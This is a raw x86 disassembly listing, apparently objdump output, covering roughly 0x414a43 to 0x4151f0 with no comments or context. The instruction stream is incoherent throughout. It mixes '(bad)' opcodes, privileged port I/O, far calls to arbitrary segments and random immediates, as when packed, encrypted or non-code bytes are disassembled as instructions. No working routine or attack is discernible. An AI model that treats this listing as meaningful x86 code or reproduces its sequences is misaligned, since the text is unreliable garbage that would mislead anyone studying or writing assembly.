  414a43:	adc    eax,DWORD PTR [ebx]
  414a45:	and    ch,cl
  414a47:	fcomp  DWORD PTR [ebx]
  414a49:	push   ebx
  414a4a:	int3   
  414a4b:	mov    dl,0x5d
  414a4d:	dec    esi
  414a4e:	dec    ebp
  414a4f:	fxch   st(7)
  414a51:	xor    eax,0xc8460b40
  414a56:	pop    es
  414a57:	ja     0x414aa6
  414a59:	or     ebp,ebp
  414a5b:	jbe    0x414a5f
  414a5d:	test   al,0xc0
  414a5f:	sub    al,0xe3
  414a61:	pushf  
  414a62:	inc    eax
  414a63:	outs   dx,DWORD PTR ds:[esi]
  414a64:	adc    BYTE PTR ds:[edi-0x4f74fb62],bh
  414a6b:	pop    ss
  414a6c:	or     BYTE PTR [ebp+0x3b],0xb4
  414a70:	sub    edi,eax
  414a72:	mov    dh,0x76
  414a74:	out    dx,al
  414a75:	enter  0xcc6d,0xcb
  414a79:	or     dl,ah
  414a7b:	rcl    BYTE PTR [ecx+0x210074ed],cl
  414a81:	push   ebx
  414a82:	mov    al,ds:0x481dd42d
  414a87:	out    0xc2,al
  414a89:	lods   al,BYTE PTR ds:[esi]
  414a8a:	jmp    0x414a37
  414a8c:	mov    esi,0x417d3867
  414a91:	push   edi
  414a92:	neg    DWORD PTR [ecx+ebp*4-0x26]
  414a96:	cmp    ah,ch
  414a98:	fs push ds
  414a9a:	xchg   esi,eax
  414a9b:	sbb    bh,BYTE PTR [esi-0x2caa7c0]
  414aa1:	icebp  
  414aa2:	xchg   esp,eax
  414aa3:	mov    ebx,?
  414aa5:	jne    0x414a86
  414aa7:	xchg   ebx,eax
  414aa8:	inc    edx
  414aa9:	dec    eax
  414aaa:	adc    esp,DWORD PTR ds:0xc4d51b02
  414ab0:	ds jle 0x414ad6
  414ab3:	inc    eax
  414ab4:	push   ecx
  414ab5:	cmp    al,0x25
  414ab7:	test   al,0x3
  414ab9:	test   DWORD PTR [edx-0x359bb3da],esp
  414abf:	sub    al,0xb3
  414ac1:	and    eax,0x27ea4df0
  414ac6:	in     eax,0xd3
  414ac8:	call   0x3d5d:0x1a892511
  414acf:	or     al,0x11
  414ad1:	mov    BYTE PTR [ecx],bh
  414ad3:	xchg   esp,eax
  414ad4:	cmp    al,0x5c
  414ad6:	ret    
  414ad7:	loopne 0x414af7
  414ad9:	push   0x1a
  414adb:	dec    ebx
  414adc:	pop    esi
  414add:	adc    ah,bh
  414adf:	push   ebp
  414ae0:	ret    0xe3dc
  414ae3:	push   ss
  414ae4:	loop   0x414af6
  414ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae7:	cdq    
  414ae8:	pop    esi
  414ae9:	push   ecx
  414aea:	push   0x1bec5d79
  414aef:	(bad)  
  414af0:	sbb    BYTE PTR [eax],dh
  414af2:	out    dx,eax
  414af3:	mov    edx,0x6f212ec1
  414af8:	pop    edi
  414af9:	nop
  414afa:	inc    eax
  414afb:	mov    dh,0x26
  414afd:	push   ss
  414afe:	ret    0xc06e
  414b01:	(bad)  
  414b02:	cmp    ch,BYTE PTR [eax]
  414b04:	cli    
  414b05:	call   0x3a7a:0xa127d9ac
  414b0c:	imul   ebx,DWORD PTR [ebx],0xffffff92
  414b0f:	bound  ebx,QWORD PTR [edx]
  414b11:	pop    edx
  414b12:	jg     0x414b4d
  414b14:	mov    al,0x58
  414b16:	stos   DWORD PTR es:[edi],eax
  414b17:	adc    DWORD PTR [edx+0x3f836b7e],0x636a02aa
  414b21:	and    eax,0x8eafe5fa
  414b26:	inc    ecx
  414b27:	xor    BYTE PTR [ebx+0x482de658],dh
  414b2d:	aaa    
  414b2e:	aas    
  414b2f:	xor    bl,dh
  414b31:	outs   dx,BYTE PTR ds:[esi]
  414b32:	retf   
  414b33:	repz leave 
  414b35:	push   esp
  414b36:	je     0x414ba1
  414b38:	scas   eax,DWORD PTR es:[edi]
  414b39:	idiv   DWORD PTR [ecx]
  414b3b:	jge    0x414b05
  414b3d:	add    dh,dh
  414b3f:	xchg   esp,eax
  414b40:	and    al,0xd7
  414b42:	add    bh,BYTE PTR [esi]
  414b44:	sbb    eax,0x62169121
  414b49:	pusha  
  414b4a:	ja     0xd96abd33
  414b50:	bound  bx,DWORD PTR es:0x78b167b3
  414b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b59:	adc    dh,BYTE PTR [ebx+0x5a]
  414b5c:	mov    al,ds:0xcde22cfd
  414b61:	or     DWORD PTR [eax-0x17e63e97],edx
  414b67:	popa   
  414b68:	push   ds
  414b69:	dec    edi
  414b6a:	sbb    al,0xf
  414b6c:	dec    edx
  414b6d:	daa    
  414b6e:	stos   BYTE PTR es:[edi],al
  414b6f:	in     al,dx
  414b70:	lds    ebx,FWORD PTR [edx*2+0x391ff582]
  414b77:	or     dh,BYTE PTR ds:0x453fa83f
  414b7d:	sub    eax,0x1632147a
  414b82:	mov    esp,0xa4189ba7
  414b87:	out    0x9e,al
  414b89:	shl    eax,cl
  414b8b:	shl    DWORD PTR [ebp+esi*1+0x3cedda0d],cl
  414b92:	test   eax,0x4efcf357
  414b97:	xchg   ebx,eax
  414b98:	lea    esp,[ebx-0x69e10264]
  414b9e:	dec    edi
  414b9f:	jbe    0x414bf7
  414ba1:	pop    ecx
  414ba2:	stos   DWORD PTR es:[edi],eax
  414ba3:	retf   
  414ba4:	adc    dh,al
  414ba6:	js     0x414bae
  414ba8:	jb     0x414ba9
  414baa:	lods   al,BYTE PTR ds:[esi]
  414bab:	out    0x9b,al
  414bad:	dec    ebx
  414bae:	cld    
  414baf:	lods   eax,DWORD PTR ds:[esi]
  414bb0:	inc    esi
  414bb1:	pop    esi
  414bb2:	mov    ds:0x2df1e6f8,eax
  414bb7:	adc    eax,0xa595a815
  414bbc:	jecxz  0x414b98
  414bbe:	jmp    0xcb1bdef8
  414bc3:	push   eax
  414bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bc5:	sub    BYTE PTR [edx-0x16],bl
  414bc8:	mov    esi,DWORD PTR [ebx+0x44ac12a6]
  414bce:	push   0xffffffcf
  414bd0:	leave  
  414bd1:	dec    ecx
  414bd2:	add    al,0xcd
  414bd4:	jae    0x414c10
  414bd6:	adc    ah,BYTE PTR [ebx+0x376361af]
  414bdc:	jge    0x414c4e
  414bde:	inc    edi
  414bdf:	aaa    
  414be0:	add    DWORD PTR [ecx],edx
  414be2:	adc    ch,0x88
  414be5:	retf   0xbcea
  414be8:	jne    0x414bc0
  414bea:	or     esp,DWORD PTR [edi+esi*2-0x71]
  414bee:	xchg   ebx,eax
  414bef:	loopne 0x414c41
  414bf1:	or     ecx,DWORD PTR [eax-0x2b]
  414bf4:	imul   eax,DWORD PTR [edx+0x6813393e],0xffffffbd
  414bfb:	shr    DWORD PTR [ecx-0x29],1
  414bfe:	mov    edx,0x4a68d50a
  414c03:	or     eax,0xe712d0f3
  414c08:	inc    eax
  414c09:	dec    esi
  414c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c0b:	mov    WORD PTR [esi-0x7105ceb9],?
  414c11:	rcr    ebx,cl
  414c13:	aad    0x2d
  414c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c16:	pop    es
  414c17:	retf   
  414c18:	push   esi
  414c19:	lahf   
  414c1a:	stos   BYTE PTR es:[edi],al
  414c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c1c:	(bad)  [ecx]
  414c1e:	call   0x45111997
  414c23:	(bad)  
  414c24:	popf   
  414c25:	xchg   ebp,eax
  414c26:	sti    
  414c27:	in     eax,0x1f
  414c29:	cmp    dl,BYTE PTR [ebp+0x77ad1b06]
  414c2f:	adc    DWORD PTR [eax+0x24],edi
  414c32:	adc    al,0xf9
  414c34:	cmp    esi,esi
  414c36:	xchg   DWORD PTR [ecx+0x4a29a088],eax
  414c3c:	aaa    
  414c3d:	push   0xffffffa4
  414c3f:	pop    ebp
  414c40:	pop    esi
  414c41:	ds jae 0x414cb7
  414c44:	fstp   DWORD PTR [edi+0x7a]
  414c47:	jno    0x414c1d
  414c49:	mov    esi,0xd1cd5a34
  414c4e:	jl     0x414bf0
  414c50:	scas   al,BYTE PTR es:[edi]
  414c51:	xlat   BYTE PTR ds:[ebx]
  414c52:	mov    edi,DWORD PTR [edx-0x77fa6af]
  414c58:	out    dx,eax
  414c59:	ins    BYTE PTR es:[edi],dx
  414c5a:	xchg   edx,eax
  414c5b:	xchg   esi,eax
  414c5c:	in     al,dx
  414c5d:	enter  0xe381,0x2b
  414c61:	imul   ebx,ebp,0x4ed4f538
  414c67:	mov    esi,0xc97758ca
  414c6c:	in     al,0xc5
  414c6e:	xor    BYTE PTR [ecx-0x414f6f7a],ch
  414c74:	add    eax,DWORD PTR [eax+ebx*8-0xb]
  414c78:	push   ebx
  414c79:	jle    0x414c74
  414c7b:	push   esi
  414c7c:	ss jg  0x414cb0
  414c7f:	jp     0x414c7f
  414c81:	dec    edi
  414c82:	and    DWORD PTR [edi+0x61],ebx
  414c85:	(bad)  
  414c86:	cmp    al,0x20
  414c88:	repnz retf 
  414c8a:	inc    BYTE PTR [eax]
  414c8c:	ret    0x5a8f
  414c8f:	mov    ss,WORD PTR [edi]
  414c91:	inc    edi
  414c92:	and    al,0x39
  414c94:	mov    al,0x55
  414c96:	dec    ecx
  414c97:	es xchg esp,eax
  414c99:	lahf   
  414c9a:	pop    ds
  414c9b:	mov    esp,0xd7435179
  414ca0:	out    0xd3,eax
  414ca2:	add    al,0x38
  414ca4:	ret    
  414ca5:	and    edx,DWORD PTR [esi+0x5105d8db]
  414cab:	into   
  414cac:	aad    0x58
  414cae:	xchg   ebx,esi
  414cb0:	xor    dh,BYTE PTR [esi]
  414cb2:	jbe    0x414cc7
  414cb4:	xor    DWORD PTR [ebx+0x69],eax
  414cb7:	push   ebp
  414cb8:	jmp    0x51e734f2
  414cbd:	into   
  414cbe:	and    BYTE PTR [ebp-0x6b],0xa2
  414cc2:	sub    eax,0x3df62ab1
  414cc7:	sub    al,0x7b
  414cc9:	jl     0x414c93
  414ccb:	sar    BYTE PTR [edi+0x2516098a],1
  414cd1:	push   ebp
  414cd2:	xchg   ebx,eax
  414cd3:	call   0x2c2e:0xe97baea8
  414cda:	xor    ah,BYTE PTR [ebx]
  414cdc:	push   0x77
  414cde:	xor    dl,BYTE PTR [esi+0x8]
  414ce1:	or     dl,dh
  414ce3:	xchg   ebp,eax
  414ce4:	jl     0x414cd5
  414ce6:	mov    ebx,0x9379df8
  414ceb:	mov    ebx,0xed7a954f
  414cf0:	sub    eax,0x10e1a9e1
  414cf5:	or     DWORD PTR [edx-0x5f],eax
  414cf8:	div    BYTE PTR [ebp-0x48]
  414cfb:	rcr    BYTE PTR [ebx-0x66bb5d7d],1
  414d01:	adc    ch,BYTE PTR [ecx-0x2b248c2]
  414d07:	xor    bh,cl
  414d09:	dec    ebx
  414d0a:	das    
  414d0b:	(bad)  
  414d0d:	loop   0x414d4d
  414d0f:	pusha  
  414d10:	cmp    DWORD PTR ds:0xbdc32106,eax
  414d16:	cmp    edi,esp
  414d18:	fiadd  WORD PTR [edi+0x4b]
  414d1b:	nop
  414d1c:	xlat   BYTE PTR ds:[ebx]
  414d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d1e:	mov    ds:0xbd1daa84,eax
  414d23:	(bad)  
  414d24:	repz scas al,BYTE PTR es:[edi]
  414d26:	ret    0x214a
  414d29:	stos   DWORD PTR es:[edi],eax
  414d2a:	ret    
  414d2b:	fldenv [ecx+0x39]
  414d2e:	mov    BYTE PTR [edi],dh
  414d30:	mov    ds:0x2610a8ea,al
  414d35:	call   0xc920:0xdda13373
  414d3c:	inc    esi
  414d3d:	pop    edi
  414d3e:	pop    ecx
  414d3f:	lods   eax,DWORD PTR ds:[esi]
  414d40:	cs add al,0x97
  414d43:	rcl    DWORD PTR [edx+0x2805fae1],cl
  414d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d4a:	sbb    esi,DWORD PTR [ecx-0x7c]
  414d4d:	das    
  414d4e:	mov    dh,0xe2
  414d50:	in     eax,dx
  414d51:	bound  eax,QWORD PTR [edx]
  414d53:	mov    al,ah
  414d55:	adc    eax,0x8c0c2bd8
  414d5a:	mov    ebp,0x1184bd0e
  414d5f:	mov    dh,BYTE PTR [edx-0xca8ca1c]
  414d65:	fcom   DWORD PTR [eax+eax*1]
  414d68:	push   ss
  414d69:	jmp    0xf68d6e9c
  414d6e:	es ss cmc 
  414d71:	or     eax,0x936c5053
  414d76:	test   al,0xa1
  414d78:	and    dh,BYTE PTR [ecx-0x172469f2]
  414d7e:	cld    
  414d7f:	iret   
  414d80:	xchg   esi,eax
  414d81:	cdq    
  414d82:	int3   
  414d83:	jp     0x414dca
  414d85:	das    
  414d86:	sub    DWORD PTR [edi+edi*1],edi
  414d89:	xor    BYTE PTR [ebx+edi*8],cl
  414d8c:	mov    al,ds:0xb97673ab
  414d91:	push   ss
  414d92:	xchg   BYTE PTR [esi-0xbafdc02],bl
  414d98:	mov    ch,0x9c
  414d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d9b:	add    DWORD PTR [edx+0xa],0x32
  414d9f:	ss jp  0x414d36
  414da2:	out    dx,al
  414da3:	retf   
  414da4:	mov    dl,0xf4
  414da6:	inc    esi
  414da7:	and    BYTE PTR ds:0xb0f5f506,ah
  414dad:	cmp    BYTE PTR [edi+edx*8-0x55a627f],ch
  414db4:	imul   esp,DWORD PTR [ebx-0xc50e5b0],0xdebb3c5b
  414dbe:	mov    bh,0xad
  414dc0:	sbb    cl,0x70
  414dc3:	ficom  WORD PTR [edx-0xd]
  414dc6:	jmp    0x414d91
  414dc8:	repz add esi,edx
  414dcb:	push   ebp
  414dcc:	cmp    bl,ah
  414dce:	and    BYTE PTR [esi],ch
  414dd0:	mov    ch,0xcf
  414dd2:	add    edx,0xffffffad
  414dd5:	scas   eax,DWORD PTR es:[edi]
  414dd6:	adc    BYTE PTR [esi+0x7133f618],ah
  414ddc:	inc    ebp
  414ddd:	leave  
  414dde:	jno    0x414e5f
  414de0:	ja     0x414d8c
  414de2:	mov    eax,0x5726ff34
  414de7:	in     eax,dx
  414de8:	sub    DWORD PTR [edx],ebp
  414dea:	loope  0x414e59
  414dec:	xchg   ebp,eax
  414ded:	sub    BYTE PTR [eax-0x79],bl
  414df0:	push   edi
  414df1:	icebp  
  414df2:	ret    
  414df3:	out    0xd9,al
  414df5:	cld    
  414df6:	inc    esi
  414df7:	call   0xa186:0x66c3f755
  414dfe:	or     eax,0x2926dd1a
  414e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e04:	sub    DWORD PTR [ebx+ecx*2],esi
  414e07:	fstp   QWORD PTR [edi-0x3ed548d9]
  414e0d:	adc    DWORD PTR [edx-0x66],ecx
  414e10:	jae    0x414dab
  414e12:	leave  
  414e13:	sbb    esi,DWORD PTR [ecx+0x50593c36]
  414e19:	mov    ah,bh
  414e1b:	and    eax,0x9944ee08
  414e20:	mov    eax,DWORD PTR [eax+0x707dbdb0]
  414e26:	loop   0x414e8c
  414e28:	mov    bh,BYTE PTR [edi]
  414e2a:	call   0x57285fd7
  414e2f:	enter  0xff20,0x59
  414e33:	les    esi,FWORD PTR [eax]
  414e35:	ja     0x414e54
  414e37:	pop    es
  414e38:	popa   
  414e39:	stos   BYTE PTR es:[edi],al
  414e3a:	push   ebx
  414e3b:	push   ecx
  414e3c:	scas   eax,DWORD PTR es:[edi]
  414e3d:	test   BYTE PTR [edi],0xa
  414e40:	lock aas 
  414e42:	cld    
  414e43:	out    dx,eax
  414e44:	adc    ah,BYTE PTR [edx+0x6f0c3c20]
  414e4a:	out    dx,eax
  414e4b:	imul   esp,DWORD PTR [edi+0x7c478c83],0x2
  414e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e53:	pop    ecx
  414e54:	pop    ds
  414e55:	mov    esp,0x2e2d07f1
  414e5a:	mov    cl,0xa3
  414e5c:	mov    ebx,0x76ca2a65
  414e61:	(bad)  
  414e62:	pop    ss
  414e63:	dec    ebp
  414e64:	les    ebx,FWORD PTR [edx]
  414e66:	xor    al,0xdc
  414e68:	mov    ebp,DWORD PTR [esi]
  414e6a:	add    bh,al
  414e6c:	push   0x19
  414e6e:	and    eax,0x374ac68a
  414e73:	lahf   
  414e74:	cs dec esi
  414e76:	inc    edi
  414e77:	xor    esp,DWORD PTR [ecx]
  414e79:	ret    
  414e7a:	jo     0x414e03
  414e7c:	or     eax,0x70242925
  414e81:	cdq    
  414e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e83:	xchg   edi,eax
  414e84:	shl    BYTE PTR [ecx],0xe0
  414e87:	cmp    bh,BYTE PTR [ecx]
  414e89:	sti    
  414e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e8b:	push   esi
  414e8c:	repz (bad) 
  414e8e:	fcmove st,st(3)
  414e90:	sub    eax,0xc066f7f5
  414e95:	push   esi
  414e96:	mov    eax,DWORD PTR [esi+0xe]
  414e99:	and    ch,BYTE PTR [esi+0x17]
  414e9c:	sub    al,BYTE PTR [esi-0x4546a37c]
  414ea2:	push   ss
  414ea3:	push   0xfffffff1
  414ea5:	mov    eax,edx
  414ea7:	es test al,0x7d
  414eaa:	inc    edx
  414eab:	add    eax,0xecb88dbc
  414eb0:	pop    es
  414eb1:	xchg   edx,eax
  414eb2:	(bad)
  414eb5:	and    BYTE PTR [eax-0x10],bl
  414eb8:	sahf   
  414eb9:	dec    ebp
  414eba:	hlt    
  414ebb:	aam    0xf1
  414ebd:	pop    eax
  414ebe:	sub    bl,BYTE PTR [ecx-0x5b9e68cb]
  414ec4:	xchg   esp,eax
  414ec5:	push   cs
  414ec6:	cmc    
  414ec7:	cmp    eax,DWORD PTR [bx+0x7]
  414ecb:	push   0xabba4af9
  414ed0:	xor    al,0x1d
  414ed2:	push   ss
  414ed3:	and    DWORD PTR [ecx+0x5f],esp
  414ed6:	(bad)  
  414ed7:	push   edx
  414ed8:	cmp    al,0xe
  414eda:	rol    BYTE PTR [esp+esi*1+0x5c6e219e],1
  414ee1:	push   0xffffffd5
  414ee3:	in     eax,dx
  414ee4:	pushf  
  414ee5:	mov    ebx,?
  414ee7:	es pop eax
  414ee9:	or     al,0x5f
  414eeb:	outs   dx,BYTE PTR ds:[esi]
  414eec:	rol    BYTE PTR [ecx-0x2892e76c],0x66
  414ef3:	inc    ebp
  414ef4:	jbe    0x414ea2
  414ef6:	push   edi
  414ef7:	xor    eax,0x44fc9c83
  414efc:	xchg   DWORD PTR [ecx+0x59],ebp
  414eff:	js     0x414f21
  414f01:	sar    edi,0x57
  414f04:	out    0x11,al
  414f06:	sbb    eax,0xed230c15
  414f0b:	dec    esi
  414f0c:	imul   ebx,DWORD PTR [edi-0x683954ae],0xfffffff6
  414f13:	add    DWORD PTR [ebx],0xffffff97
  414f16:	outs   dx,BYTE PTR ds:[esi]
  414f17:	add    al,0xb9
  414f19:	fmul   QWORD PTR [edx]
  414f1b:	push   ebx
  414f1c:	and    eax,0xbb2e3f22
  414f21:	dec    esp
  414f22:	shl    eax,cl
  414f24:	enter  0x5a22,0x68
  414f28:	(bad)  
  414f29:	bound  esp,QWORD PTR [ecx-0x78]
  414f2c:	mov    ecx,0x295a2e3
  414f31:	push   edx
  414f32:	pop    ecx
  414f33:	test   DWORD PTR [ecx],esi
  414f35:	pop    edi
  414f36:	sbb    al,0xc8
  414f38:	cli    
  414f39:	in     al,0x74
  414f3b:	les    ebx,FWORD PTR [edi-0x6e66dd67]
  414f41:	retf   
  414f42:	dec    esp
  414f43:	jns    0x414f21
  414f45:	mov    ecx,DWORD PTR [eax+edx*4]
  414f48:	addr16 xchg edx,eax
  414f4a:	jae    0x414fc1
  414f4c:	xor    al,BYTE PTR [edx+0x18]
  414f4f:	sub    al,0x6d
  414f52:	jle    0x414f82
  414f54:	fimul  DWORD PTR [ebp-0x6c]
  414f57:	clc    
  414f58:	scas   al,BYTE PTR es:[edi]
  414f59:	scas   al,BYTE PTR es:[edi]
  414f5a:	jo     0x414eea
  414f5c:	popa   
  414f5d:	aad    0xb8
  414f5f:	gs pop edi
  414f61:	jmp    0xc09afea7
  414f66:	jmp    0x43e1:0x18073b5f
  414f6d:	jg     0x414f17
  414f6f:	sub    eax,0xb3ab3f05
  414f74:	xchg   ecx,eax
  414f75:	mov    esp,0xacd614f5
  414f7a:	push   0x42183191
  414f7f:	mov    dl,0x5d
  414f81:	and    BYTE PTR [ebx+0x1c3c3d3a],ah
  414f87:	and    eax,0xdf438db7
  414f8c:	push   ebx
  414f8d:	nop
  414f8e:	or     al,dh
  414f90:	add    al,0x22
  414f92:	fist   WORD PTR [ebx]
  414f94:	add    DWORD PTR [ebx+0x2c],edx
  414f97:	fnstsw WORD PTR [ecx+0x7b6b8c4a]
  414f9d:	ins    BYTE PTR es:[edi],dx
  414f9e:	cmp    BYTE PTR [ebx+0x75dc2cc2],dh
  414fa4:	pop    esp
  414fa5:	inc    BYTE PTR [esi-0x65]
  414fa8:	xchg   esi,ebp
  414faa:	pop    esp
  414fab:	pop    esp
  414fac:	loope  0x415019
  414fae:	(bad)  
  414faf:	sub    DWORD PTR [esi-0x1a53597f],ebx
  414fb5:	push   0xffffff8d
  414fb7:	add    ch,BYTE PTR [edi+eiz*2+0x5ce6857d]
  414fbe:	mov    esp,0xda4d4c67
  414fc3:	ror    BYTE PTR [esi+eax*1],cl
  414fc6:	adc    edx,ebp
  414fc8:	das    
  414fc9:	test   DWORD PTR [eax+eax*8],0xb56eda1b
  414fd0:	fisubr WORD PTR [esi-0x1dfc2ae4]
  414fd6:	outs   dx,BYTE PTR ds:[esi]
  414fd7:	pop    edi
  414fd8:	and    BYTE PTR ss:[ebx],dl
  414fdb:	push   esi
  414fdc:	out    dx,eax
  414fdd:	loop   0x414f62
  414fdf:	mov    dl,0xf2
  414fe1:	mov    ebx,0xe6e6fb6a
  414fe6:	push   cs
  414fe7:	sbb    al,0x25
  414fe9:	idiv   DWORD PTR ds:0x35e9eff3
  414fef:	fwait
  414ff0:	jns    0x41506a
  414ff2:	add    al,0x81
  414ff4:	mov    dl,0xc5
  414ff6:	fisub  WORD PTR [edx+eiz*4+0x4922ff74]
  414ffd:	int3   
  414ffe:	stc    
  414fff:	inc    ebx
  415000:	test   al,0x9e
  415002:	mov    cl,BYTE PTR [ebp+0x32623f18]
  415008:	fild   WORD PTR [edx+0x5d]
  41500b:	and    DWORD PTR [eax+edi*1-0x2d],ebp
  41500f:	fst    DWORD PTR [ebp-0x60]
  415012:	sbb    dl,bl
  415014:	in     al,0xa7
  415016:	sbb    esi,DWORD PTR ds:0x14086586
  41501c:	rcl    DWORD PTR [ebx-0x56396903],0xb
  415023:	pushw  es
  415025:	(bad)  
  415026:	pop    ds
  415027:	(bad)  
  415028:	mov    dh,0x46
  41502a:	and    ch,BYTE PTR [ebx]
  41502c:	mov    eax,ds:0x99ac1a8f
  415031:	inc    ebx
  415032:	sti    
  415033:	mov    esi,0xd5700bda
  415038:	out    0x22,al
  41503a:	int    0xe6
  41503c:	mov    dl,0x94
  41503e:	loop   0x415026
  415040:	jno    0x41509f
  415042:	mov    ch,0x3b
  415044:	or     eax,0x24dd2b12
  415049:	test   eax,0xa280e341
  41504e:	mov    BYTE PTR [edx-0xfa06e4d],dh
  415054:	add    eax,0x47ece9aa
  415059:	and    dl,BYTE PTR [ebx+eiz*2-0x38507c4]
  415060:	mov    dh,0xbe
  415062:	std    
  415063:	jecxz  0x41504d
  415065:	fistp  QWORD PTR [edx+0x13118191]
  41506b:	push   edx
  41506c:	pop    ss
  41506d:	shl    DWORD PTR ds:0xe497ce1e,0x92
  415074:	cli    
  415075:	int    0xce
  415077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415078:	push   eax
  415079:	test   al,0x64
  41507b:	iret   
  41507c:	sub    edx,eax
  41507e:	leave  
  41507f:	addr16 cdq 
  415081:	jmp    0x4859698c
  415086:	inc    ebx
  415087:	jae    0x415095
  415089:	dec    edx
  41508a:	inc    ebp
  41508b:	and    ah,cl
  41508d:	stc    
  41508e:	pop    ss
  41508f:	sub    al,0x31
  415091:	push   ebp
  415092:	mov    ds:0x62c30bbb,al
  415097:	adc    ebp,DWORD PTR [eax]
  415099:	xlat   BYTE PTR ds:[ebx]
  41509a:	test   DWORD PTR [ecx-0x3b],0xba932ac8
  4150a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150a2:	test   edi,esp
  4150a4:	test   eax,0xca792a2d
  4150a9:	imul   ebp,DWORD PTR [ebx],0x16
  4150ac:	sub    BYTE PTR [ebp+0x71],ch
  4150af:	xchg   DWORD PTR [esi+0x31],eax
  4150b2:	dec    eax
  4150b3:	lods   eax,DWORD PTR ds:[esi]
  4150b4:	xor    edi,eax
  4150b6:	mov    bh,0x32
  4150b8:	mov    esp,0x16ba7a23
  4150bd:	mov    bh,0x59
  4150bf:	je     0x41512a
  4150c1:	(bad)  
  4150c2:	jecxz  0x41505c
  4150c4:	stos   BYTE PTR es:[edi],al
  4150c5:	or     DWORD PTR [eax-0x4ea629db],0x14ef6f0
  4150cf:	xor    eax,DWORD PTR [eax+ecx*1-0x58]
  4150d3:	lea    ecx,[eax-0x4d]
  4150d6:	ds ss (bad) 
  4150d9:	cld    
  4150da:	pop    esp
  4150db:	mov    ecx,0x1dbe605a
  4150e0:	(bad)  
  4150e1:	fiadd  WORD PTR [edx+0x59]
  4150e4:	out    dx,eax
  4150e5:	sti    
  4150e6:	icebp  
  4150e7:	(bad)  
  4150e8:	sub    ch,BYTE PTR [edx-0x6ee16bee]
  4150ee:	xor    dl,BYTE PTR [eax-0x3cf842f4]
  4150f4:	dec    edi
  4150f5:	or     ecx,edx
  4150f7:	and    DWORD PTR [esi],eax
  4150f9:	int3   
  4150fa:	jbe    0x4150ad
  4150fc:	xchg   ebp,eax
  4150fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150fe:	pusha  
  4150ff:	shl    BYTE PTR [edi-0x7d650393],1
  415105:	push   cs
  415106:	nop
  415107:	(bad)  
  415108:	or     ebx,DWORD PTR [esi+0x521a5822]
  41510e:	bndstx [esi+0x59],bnd2
  415112:	push   0x3d507941
  415117:	lods   eax,DWORD PTR ds:[esi]
  415118:	sbb    dl,bh
  41511a:	imul   esp,DWORD PTR [ecx],0xb7bbf4c0
  415120:	add    al,0x87
  415122:	int3   
  415123:	xchg   esi,eax
  415124:	add    al,0xac
  415126:	fcmove st,st(4)
  415128:	pop    ds
  415129:	hlt    
  41512a:	out    0xde,eax
  41512c:	mov    eax,0xb766cfe5
  415131:	mov    edx,0x80c80106
  415136:	lea    edi,[eax+0x0]
  415139:	out    dx,eax
  41513a:	mov    al,BYTE PTR [ebx-0x1fd2ccad]
  415140:	sub    eax,DWORD PTR [edi+0x33d4619d]
  415146:	jle    0x415125
  415148:	(bad)  
  415149:	out    0x53,al
  41514b:	in     eax,dx
  41514c:	out    0xa7,eax
  41514e:	xor    ebx,DWORD PTR [ecx]
  415150:	pop    esp
  415151:	dec    eax
  415152:	outs   dx,BYTE PTR ds:[esi]
  415153:	lods   eax,DWORD PTR ds:[esi]
  415154:	mov    ?,WORD PTR [edx+0x47]
  415157:	imul   esp,DWORD PTR [eax+edx*4+0xe5a85c7],0xe4d45bc
  415162:	or     eax,0x71b8dc0e
  415167:	inc    esi
  415168:	xor    ah,ch
  41516a:	loope  0x41510d
  41516c:	fwait
  41516d:	add    ebp,DWORD PTR [eax+eax*2+0x7e1d9f85]
  415174:	cmp    ecx,DWORD PTR [eax-0x14]
  415177:	dec    edx
  415178:	cs hlt 
  41517a:	inc    DWORD PTR [esi]
  41517c:	mov    ah,bl
  41517e:	test   BYTE PTR [edx+ebp*8+0x16],ah
  415182:	push   esi
  415183:	loope  0x415125
  415185:	sub    eax,0xfd390ffd
  41518a:	test   BYTE PTR [ebp-0x3fe98260],0x77
  415191:	dec    eax
  415192:	cmp    al,0x80
  415194:	dec    ecx
  415195:	iret   
  415196:	lods   al,BYTE PTR ds:[esi]
  415197:	xchg   cl,ah
  415199:	pop    esp
  41519a:	int    0x83
  41519c:	mov    ebp,0x1dc80da6
  4151a1:	lods   al,BYTE PTR ds:[esi]
  4151a2:	or     ch,BYTE PTR [ecx]
  4151a4:	arpl   WORD PTR [ebp+0x6cfbce23],dx
  4151aa:	jb     0x41515c
  4151ac:	sbb    al,0xfa
  4151ae:	mov    BYTE PTR [edx-0x75],al
  4151b1:	frstor [ecx-0x53]
  4151b4:	inc    ecx
  4151b5:	pop    edi
  4151b6:	mov    esp,0x2a98e456
  4151bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151bc:	out    dx,al
  4151bd:	push   es
  4151be:	fcomp  DWORD PTR [ebx+0x7b73ae85]
  4151c4:	push   eax
  4151c5:	jp     0x4151e2
  4151c7:	ret    
  4151c8:	ret    0x3d19
  4151cb:	xchg   edi,eax
  4151cc:	add    BYTE PTR gs:[ebx+0x5263f77a],ah
  4151d3:	jmp    0x41523e
  4151d5:	arpl   WORD PTR [ebp-0x7b],sp
  4151d8:	fs push ebp
  4151da:	pop    ecx
  4151db:	and    eax,0x5819f178
  4151e0:	pop    ebp
  4151e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e2:	sub    eax,ecx
  4151e4:	jns    0x41516f
  4151e6:	scas   eax,DWORD PTR es:[edi]
  4151e7:	(bad)  
  4151e8:	and    eax,0x6f562c9f
  4151ed:	sbb    ebx,DWORD PTR [eax-0x4e]
  4151f0:	pop    edi
